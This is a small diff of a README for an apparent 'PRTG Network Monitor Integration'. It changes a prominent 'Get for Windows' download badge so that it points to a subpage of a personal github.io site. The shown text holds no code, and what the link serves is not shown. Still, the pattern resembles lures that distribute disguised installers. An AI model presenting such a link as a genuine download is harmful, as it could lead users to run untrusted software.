@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://caricoreil340.github.io/.github/)
+[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://caricoreil340.github.io/.github/prtg-monitoring)
 </div>
 
 ## What is this PRTG Network Monitor Integration?
